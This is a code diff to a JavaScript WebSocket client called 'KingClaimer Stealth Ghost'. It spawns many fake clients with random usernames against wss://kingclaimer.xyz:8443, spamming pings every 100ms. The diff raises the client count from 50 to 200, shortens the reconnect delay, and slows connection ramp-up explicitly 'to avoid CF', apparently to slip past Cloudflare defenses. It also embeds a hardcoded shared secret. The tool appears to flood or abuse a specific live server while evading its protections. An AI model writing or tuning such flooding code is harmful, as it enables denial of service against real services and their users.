@@ -4,8 +4,8 @@
 // ==========================================
 
 const SERVER_URL = "wss://kingclaimer.xyz:8443/";
-const TOTAL_CLIENTS = 50;
-const RECONNECT_DELAY = 800;
+const TOTAL_CLIENTS = 200;
+const RECONNECT_DELAY = 450;
 const SHARED_SECRET = "vipxK9mP2vL8nQ4wRjT5bYc";
 
 let clients = [];
@@ -69,7 +69,7 @@ function log(message, type = 'info') {
 // ==========================================
 function generateRandomUsername() {
     const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    const length = 8 + Math.floor(Math.random() * 4);
+    const length = 8 + Math.floor(Math.random() * 5);
     let username = "";
     for (let i = 0; i < length; i++) {
         username += chars[Math.floor(Math.random() * chars.length)];
@@ -128,7 +128,7 @@ class StressClient {
                 };
                 this.ws.send(JSON.stringify(regPayload));
 
-                // Dummy ping spam every 100ms
+                // Dummy ping spam every 100ms to keep connection alive
                 setInterval(() => {
                     if (this.ws && this.ws.readyState === WebSocket.OPEN) {
                         this.ws.send(JSON.stringify({ type: "ping" }));
@@ -206,12 +206,12 @@ async function startGhost() {
     if (isRunning) return;
     isRunning = true;
     clients = [];
-    log("🚀 Starting KingClaimer Stealth Ghost...", 'success');
+    log("🚀 Starting KingClaimer Stealth Ghost (Gradual Connection)...", 'success');
 
     for (let i = 0; i < TOTAL_CLIENTS; i++) {
         const client = new StressClient(i);
         clients.push(client);
-        setTimeout(() => client.connect(), i * 850);
+        setTimeout(() => client.connect(), i * 1200); // Slower gradual start to avoid CF
     }
 }
 
